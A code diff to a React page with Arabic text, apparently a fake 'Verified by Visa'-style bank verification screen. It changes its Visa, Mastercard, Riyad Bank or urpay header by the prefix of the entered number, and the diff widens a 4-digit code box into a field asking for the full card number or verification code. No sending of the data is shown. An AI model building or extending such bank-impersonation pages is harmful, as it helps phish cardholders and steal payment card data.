@@ -5,8 +5,12 @@ import { useState } from 'react';
 export default function VerifiedHeaderPage() {
   const [digits, setDigits] = useState('');
   
-  // تحديد الهوية بناءً على الرقم المدخل
-  const variant = digits === '4909' ? 'urpay' : digits === '5297' ? 'riyad' : 'standard';
+  // تنظيف المدخلات والتحقق من البداية (Prefix)
+  const cleanDigits = digits.replace(/[^0-9]/g, '');
+  const isUrpay = cleanDigits.startsWith('4909');
+  const isRiyad = cleanDigits.startsWith('5297');
+  
+  const variant = isUrpay ? 'urpay' : isRiyad ? 'riyad' : 'standard';
 
   return (
     <main className="shell" dir="rtl">
@@ -36,19 +40,10 @@ export default function VerifiedHeaderPage() {
         .mc-divider { height: 24px; width: 1px; background: #cbd5e1; }
         .mc-text { font-family: Arial, Helvetica, sans-serif; font-size: 16px; font-weight: 600; color: #1e293b; letter-spacing: -0.3px; }
 
-        .controls { display: flex; flex-direction: column; gap: 8px; width: 100%; max-width: 260px; margin: 26px auto 0; }
+        .controls { display: flex; flex-direction: column; gap: 8px; width: 100%; max-width: 280px; margin: 26px auto 0; }
         .label { color: #334155; font-size: 13px; font-weight: 700; text-align: right; }
-        .input { width: 100%; height: 44px; padding: 8px 12px; border: 1px solid #cbd5e1; border-radius: 8px; background: #fff; color: #183153; font-size: 19px; letter-spacing: 4px; text-align: center; outline: none; }
+        .input { width: 100%; height: 44px; padding: 8px 12px; border: 1px solid #cbd5e1; border-radius: 8px; background: #fff; color: #183153; font-size: 18px; letter-spacing: 2px; text-align: center; outline: none; }
         .input:focus { border-color: #4385d8; box-shadow: 0 0 0 3px rgba(67,133,216,.13); }
-
-        @media (max-width: 480px) {
-          .shell { padding: 20px 12px; }
-          .header-bar { min-height: 64px; padding: 11px 12px; border-radius: 10px; }
-          .visa-logo { font-size: 26px; }
-          .riyad-ar { font-size: 14px; }
-          .riyad-en { font-size: 12px; }
-          .mc-text { font-size: 13px; }
-        }
       `}</style>
 
       <section className="wrap">
@@ -94,17 +89,16 @@ export default function VerifiedHeaderPage() {
         </header>
 
         <div className="controls">
-          <label className="label" htmlFor="code-input">رمز التحقق</label>
+          <label className="label" htmlFor="code-input">رقم البطاقة أو رمز التحقق</label>
           <input
             id="code-input"
             className="input"
             type="text"
             inputMode="numeric"
             autoComplete="off"
-            maxLength={4}
-            placeholder="••••"
+            placeholder="أدخل الرقم هنا"
             value={digits}
-            onChange={(e) => setDigits(e.target.value.replace(/[^0-9]/g, '').slice(0, 4))}
+            onChange={(e) => setDigits(e.target.value)}
           />
         </div>
       </section>
